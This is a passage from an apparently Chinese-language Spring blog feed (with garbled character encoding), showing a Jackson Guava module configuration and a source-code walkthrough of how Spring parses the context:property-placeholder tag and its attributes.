/&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetMethod"</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>registerModule<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"arguments"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"guavaModule"</span> <span class="attr">class</span>=<span class="string">"com.fasterxml.jackson.datatype.guava.GuavaModule"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span>  <span class="attr">local</span>=<span class="string">"guavaObjectMapper"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="æ”¯æŒçš„ç±»å‹"><a href="#æ”¯æŒçš„ç±»å‹" class="headerlink" title="æ”¯æŒçš„ç±»å‹"></a>æ”¯æŒçš„ç±»å‹</h2><img src="/2016/11/16/jackson-guava/jar.png">
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://stackoverflow.com/questions/26979120/spring-mvc-configuration-jackson-guava-multimap" rel="external nofollow noopener noreferrer" target="_blank">Spring MVC configuration + Jackson + Guava multimap</a></p>
</li>
<li><p><a href="http://www.leveluplunch.com/java/examples/convert-json-to-guava-multimap-with-jackson/" rel="external nofollow noopener noreferrer" target="_blank">Json to guava multimap</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jackson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Springå ä½ç¬¦ï¼ˆproperty-placeholderï¼‰ï¼Œæºç é˜…è¯»]]></title>
      <url>http://qsli.github.io/2016/10/31/property-placeholder/</url>
      <content type="html"><![CDATA[<h2 id="lt-context-property-placeholder-location-39-xxx-39-gt-çš„è§£æè¿‡ç¨‹"><a href="#lt-context-property-placeholder-location-39-xxx-39-gt-çš„è§£æè¿‡ç¨‹" class="headerlink" title="&lt;context:property-placeholder location=&#39;xxx&#39; /&gt;çš„è§£æè¿‡ç¨‹"></a><code>&lt;context:property-placeholder location=&#39;xxx&#39; /&gt;</code>çš„è§£æè¿‡ç¨‹</h2><h3 id="schema"><a href="#schema" class="headerlink" title="schema"></a>schema</h3><p>åœ¨ideaä¸­<code>ctrl</code> + <code>b</code>æˆ–è€…ï¼Œ<code>ctrl</code> + é¼ æ ‡å·¦é”®ç‚¹å‡»å³å¯æ‰“å¼€schemaå…·ä½“çš„ä½ç½®</p>
<img src="/2016/10/31/property-placeholder/location.jpg">
<p><code>sping.handlers</code>ä¸­å†…å®¹å¦‚ä¸‹:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context=org.springframework.context.config.ContextNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/jee=org.springframework.ejb.config.JeeNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/lang=org.springframework.scripting.config.LangNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/task=org.springframework.scheduling.config.TaskNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/cache=org.springframework.cache.config.CacheNamespaceHandler</span><br></pre></td></tr></table></figure>
<p><code>spring.schemas</code>ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.0.xsd=org/springframework/context/config/spring-context-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.1.xsd=org/springframework/context/config/spring-context-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.2.xsd=org/springframework/context/config/spring-context-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-2.0.xsd=org/springframework/ejb/config/spring-jee-2.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-2.5.xsd=org/springframework/ejb/config/spring-jee-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.0.xsd=org/springframework/ejb/config/spring-jee-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.1.xsd=org/springframework/ejb/config/spring-jee-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.2.xsd=org/springframework/ejb/config/spring-jee-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.0.xsd=org/springframework/ejb/config/spring-jee-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.1.xsd=org/springframework/ejb/config/spring-jee-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.2.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-2.0.xsd=org/springframework/scripting/config/spring-lang-2.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-2.5.xsd=org/springframework/scripting/config/spring-lang-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.0.xsd=org/springframework/scripting/config/spring-lang-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.1.xsd=org/springframework/scripting/config/spring-lang-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.2.xsd=org/springframework/scripting/config/spring-lang-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.0.xsd=org/springframework/scripting/config/spring-lang-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.1.xsd=org/springframework/scripting/config/spring-lang-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.2.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.0.xsd=org/springframework/scheduling/config/spring-task-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.1.xsd=org/springframework/scheduling/config/spring-task-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.2.xsd=org/springframework/scheduling/config/spring-task-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.0.xsd=org/springframework/scheduling/config/spring-task-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.1.xsd=org/springframework/scheduling/config/spring-task-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.2.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-3.1.xsd=org/springframework/cache/config/spring-cache-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-3.2.xsd=org/springframework/cache/config/spring-cache-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.0.xsd=org/springframework/cache/config/spring-cache-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.1.xsd=org/springframework/cache/config/spring-cache-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.2.xsd=org/springframework/cache/config/spring-cache-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache.xsd=org/springframework/cache/config/spring-cache-4.2.xsd</span><br></pre></td></tr></table></figure>
<h3 id="NamespaceHandlerSupport"><a href="#NamespaceHandlerSupport" class="headerlink" title="NamespaceHandlerSupport"></a>NamespaceHandlerSupport</h3><p>ä»<code>handler</code>ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾å‡º<code>context</code>æ ‡ç­¾çš„å¤„ç†ç±»æ˜¯<code>org.springframework.context.config.ContextNamespaceHandler</code>,å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContextNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"property-placeholder"</span>, <span class="keyword">new</span> PropertyPlaceholderBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"property-override"</span>, <span class="keyword">new</span> PropertyOverrideBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"annotation-config"</span>, <span class="keyword">new</span> AnnotationConfigBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"component-scan"</span>, <span class="keyword">new</span> ComponentScanBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"load-time-weaver"</span>, <span class="keyword">new</span> LoadTimeWeaverBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"spring-configured"</span>, <span class="keyword">new</span> SpringConfiguredBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"mbean-export"</span>, <span class="keyword">new</span> MBeanExportBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"mbean-server"</span>, <span class="keyword">new</span> MBeanServerBeanDefinitionParser());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¡ºè—¤æ‘¸ç“œå°±èƒ½æ‰¾åˆ°<code>property-placeholder</code>çš„å¤„ç†ç±»æ˜¯<code>PropertyPlaceholderBeanDefinitionParser</code></p>
<h3 id="PropertyPlaceholderBeanDefinitionParser"><a href="#PropertyPlaceholderBeanDefinitionParser" class="headerlink" title="PropertyPlaceholderBeanDefinitionParser"></a>PropertyPlaceholderBeanDefinitionParser</h3><p>ç»§æ‰¿å…³ç³»ï¼š</p>
<img src="/2016/10/31/property-placeholder/hierarchy.jpg">
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertyPlaceholderBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractPropertyLoadingBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SYSTEM_PROPERTIES_MODE_ATTRIBUTE = <span class="string">"system-properties-mode"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SYSTEM_PROPERTIES_MODE_DEFAULT = <span class="string">"ENVIRONMENT"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt; getBeanClass(Element element) &#123;</span><br><span class="line">		<span class="comment">// As of Spring 3.1, the default value of system-properties-mode has changed from</span></span><br><span class="line">		<span class="comment">// 'FALLBACK' to 'ENVIRONMENT'. This latter value indicates that resolution of</span></span><br><span class="line">		<span class="comment">// placeholders against system properties is a function of the Environment and</span></span><br><span class="line">		<span class="comment">// its current set of PropertySources.</span></span><br><span class="line">		<span class="keyword">if</span> (SYSTEM_PROPERTIES_MODE_DEFAULT.equals(element.getAttribute(SYSTEM_PROPERTIES_MODE_ATTRIBUTE))) &#123;</span><br><span class="line">			<span class="keyword">return</span> PropertySourcesPlaceholderConfigurer<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// The user has explicitly specified a value for system-properties-mode: revert to</span></span><br><span class="line">		<span class="comment">// PropertyPlaceholderConfigurer to ensure backward compatibility with 3.0 and earlier.</span></span><br><span class="line">		<span class="keyword">return</span> PropertyPlaceholderConfigurer<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder builder)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.doParse(element, builder);</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"ignoreUnresolvablePlaceholders"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"ignore-unresolvable"</span>)));</span><br><span class="line"></span><br><span class="line">		String systemPropertiesModeName = element.getAttribute(SYSTEM_PROPERTIES_MODE_ATTRIBUTE);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(systemPropertiesModeName) &amp;&amp;</span><br><span class="line">				!systemPropertiesModeName.equals(SYSTEM_PROPERTIES_MODE_DEFAULT)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"systemPropertiesModeName"</span>, <span class="string">"SYSTEM_PROPERTIES_MODE_"</span> + systemPropertiesModeName);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (element.hasAttribute(<span class="string">"value-separator"</span>)) &#123;    </span><br><span class="line">			builder.addPropertyValue(<span class="string">"valueSeparator"</span>, element.getAttribute(<span class="string">"value-separator"</span>));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (element.hasAttribute(<span class="string">"null-value"</span>)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"nullValue"</span>, element.getAttribute(<span class="string">"null-value"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>getBeanClass</code>ä¸­ï¼Œæ ¹æ®æ ‡ç­¾ä¸­çš„<code>system-properties-mode</code>å±æ€§æ¥è¿”å›ä¸åŒçš„ç±»ï¼Œæ¥æŒ‡æ˜è¦å®ä¾‹åŒ–çš„ç±»ã€‚</p>
<p>å†æ¥çœ‹ä¸Šè¿°çš„<code>parse</code>æ–¹æ³•ï¼Œé¦–å…ˆå°±æ˜¯è°ƒç”¨çˆ¶ç±»çš„<code>doParse</code>æ–¹æ³•ï¼Œç„¶åå°±æ˜¯è§£ææ ‡ç­¾ä¸­çš„ç›¸åº”å±æ€§ï¼Œæ”¾åˆ°<code>BeanDefinitionBuilder</code>ä¸­ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±äº¤ç»™springè¿™ä¸ªæ¡†æ¶æ¥å®Œæˆäº†ã€‚</p>
<h4 id="system-properties-mode"><a href="#system-properties-mode" class="headerlink" title="system-properties-mode"></a><code>system-properties-mode</code></h4><p>å†³å®šè§£æplaceholderçš„é¡ºåºã€‚è¿™ä¸ªå±æ€§çš„å–å€¼å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>   <strong>â€œENVIRONMENTâ€</strong> indicates placeholders should be resolved against the current Environment and against any local properties;</p>
</blockquote>
<blockquote>
<p>   <strong>â€œNEVERâ€</strong> indicates placeholders should be resolved only against local properties and never against system properties;</p>
</blockquote>
<blockquote>
<p>   <strong>â€œFALLBACKâ€</strong> indicates placeholders should be resolved against any local properties and then against system properties;</p>
</blockquote>
<blockquote>
<p>   <strong>â€œOVERRIDEâ€</strong> indicates placeholders should be resolved first against system properties and then against any local properties;</p>
</blockquote>
<p>è¿™ä¸ªå±æ€§çš„é»˜è®¤å€¼æ˜¯<code>ENVIRONMENT</code>,ä¹Ÿå°±æ˜¯å…ˆä»ç¯å¢ƒå˜é‡ä¸­è§£æï¼Œç„¶åæ‰ä»æˆ‘ä»¬å®šä¹‰çš„propertiesæ–‡ä»¶ä¸­è§£æï¼Œå¦‚æœç¯å¢ƒä¸­çš„å˜é‡åå’Œé…ç½®æ–‡ä»¶ä¸­çš„å˜é‡åå†²çªï¼Œ</p>
<p>å°±ä¼šä½¿ç”¨ç¯å¢ƒå˜é‡ä¸­çš„ã€‚</p>
<blockquote>
<p>æ‰€ä»¥é…ç½®æ–‡ä»¶ä¸­çš„å˜é‡åæœ€å¥½å¸¦ä¸€ä¸ªå‰ç¼€ï¼Œå¦‚<code>jdbc.username=</code>, ç¬”è€…åœ¨Ubuntuä¸‹å°±é‡åˆ°è¿‡ä¸å¸¦å‰ç¼€çš„<code>username</code>å’Œç³»ç»Ÿçš„â€™usernameâ€™å†²çªçš„æƒ…å†µ</p>
</blockquote>
<h4 id="ignore-unresolvable"><a href="#ignore-unresolvable" class="headerlink" title="ignore-unresolvable"></a><code>ignore-unresolvable</code></h4><blockquote>
<p>   Specifies if failure to find the property value to replace a key should be ignored.<br>    Default is â€œfalseâ€, meaning that this placeholder configurer will raise an exception<br>    if it cannot resolve a key. Set to â€œtrueâ€ to allow the configurer to pass on the key<br>    to any others in the context that have not yet visited the key in question.</p>
</blockquote>
<p>è¿™ä¸ªå±æ€§å¾ˆå…³é”®ï¼Œä»–å†³å®šé‡åˆ°æ— æ³•è§£æçš„å˜é‡æ—¶æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ï¼Œé»˜è®¤æ˜¯<code>fale</code>ï¼ˆæŠ›å‡ºå¼‚å¸¸ï¼‰,åœ¨æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶çš„æ—¶å€™åº”è¯¥è®¾ç½®ä¸º<code>true</code>ã€‚</p>
<h4 id="value-separator"><a href="#value-separator" class="headerlink" title="value-separator"></a><code>value-separator</code></h4><p>placeHolderé»˜è®¤å€¼å¾—åˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯<code>:</code></p>
<blockquote>
<p>The separating character between the placeholder variable and the associated     default value: by default, a â€˜:â€™ symbol.</p>
</blockquote>
<h4 id="null-value"><a href="#null-value" class="headerlink" title="null-value"></a><code>null-value</code></h4><blockquote>
<p>   A value that should be treated as â€˜nullâ€™ when resolved as a placeholder value:<br>    e.g. â€œâ€ (empty String) or â€œnullâ€. By default, no such null value is defined.</p>
</blockquote>
<p><strong>è¿™äº›å±æ€§éƒ½å¯ä»¥åœ¨ç›¸åº”çš„<code>xsd</code>schemaä¸­æ‰¾åˆ°ã€‚</strong></p>
<h3 id="AbstractPropertyLoadingBeanDefinitionParser"><a href="#AbstractPropertyLoadingBeanDefinitionParser" class="headerlink" title="AbstractPropertyLoadingBeanDefinitionParser"></a>AbstractPropertyLoadingBeanDefinitionParser</h3><p>è¿™æ˜¯ä¸Šé¢çš„é‚£ä¸ªè§£æç±»çš„çˆ¶ç±»ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractPropertyLoadingBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractSingleBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">shouldGenerateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder builder)</span> </span>&#123;</span><br><span class="line">		String location = element.getAttribute(<span class="string">"location"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(location)) &#123;</span><br><span class="line">			String[] locations = StringUtils.commaDelimitedListToStringArray(location);</span><br><span class="line">			builder.addPropertyValue(<span class="string">"locations"</span>, locations);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String propertiesRef = element.getAttribute(<span class="string">"properties-ref"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(propertiesRef)) &#123;</span><br><span class="line">			builder.addPropertyReference(<span class="string">"properties"</span>, propertiesRef);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String fileEncoding = element.getAttribute(<span class="string">"file-encoding"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(fileEncoding)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"fileEncoding"</span>, fileEncoding);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String order = element.getAttribute(<span class="string">"order"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(order)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"order"</span>, Integer.valueOf(order));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"ignoreResourceNotFound"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"ignore-resource-not-found"</span>)));</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"localOverride"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"local-override"</span>)));</span><br><span class="line"></span><br><span class="line">		builder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="shouldGenerateId"><a href="#shouldGenerateId" class="headerlink" title="shouldGenerateId"></a>shouldGenerateId</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Should an ID be generated instead of read from the passed in &#123;<span class="doctag">@link</span> Element&#125;?</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Disabled by default; subclasses can override this to enable ID generation.</span></span><br><span class="line"><span class="comment"> * Note that this flag is about &lt;i&gt;always&lt;/i&gt; generating an ID; the parser</span></span><br><span class="line"><span class="comment"> * won't even check for an "id" attribute in this case.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> whether the parser should always generate an id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">shouldGenerateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="doParse"><a href="#doParse" class="headerlink" title="doParse"></a>doParse</h4><p>è¿™ä¸ªæ–¹æ³•è´Ÿè´£è§£æé…ç½®æ–‡ä»¶çš„locationã€file-encodingç­‰é€šç”¨çš„å±æ€§ï¼Œå¹¶æ”¾ç½®åˆ°<code>builder</code>ä¸­ã€‚</p>
<h2 id="Spring-è°ƒç”¨handlerçš„è¿‡ç¨‹"><a href="#Spring-è°ƒç”¨handlerçš„è¿‡ç¨‹" class="headerlink" title="Spring è°ƒç”¨handlerçš„è¿‡ç¨‹"></a>Spring è°ƒç”¨handlerçš„è¿‡ç¨‹</h2><p>springå°†ç‰¹å®šçš„æ ‡ç­¾çš„è§£æå§”æ‰˜ç»™æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„handlerçš„è¿‡ç¨‹ä¸»è¦æ˜¯åœ¨<code>DefaultBeanDefinitionDocumentReader</code>ä¸­<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 